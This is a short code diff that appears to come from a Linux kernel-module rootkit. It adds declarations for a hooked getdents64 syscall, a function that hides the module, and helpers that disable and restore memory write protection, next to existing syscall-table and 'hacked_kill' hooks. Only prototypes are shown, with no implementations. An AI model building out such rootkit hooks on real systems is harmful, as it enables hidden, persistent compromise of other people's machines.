@@ -1,7 +1,13 @@
 unsigned long *get_syscall_table_bf(void);
 static inline void tidy(void);
 asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
+asmlinkage int
+hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
+	unsigned int count);
 asmlinkage int hacked_kill(pid_t pid, int sig);
+void module_hide(void);
+static inline void protect_memory(void);
+static inline void unprotect_memory(void);
 
 struct linux_dirent {
         unsigned long   d_ino;
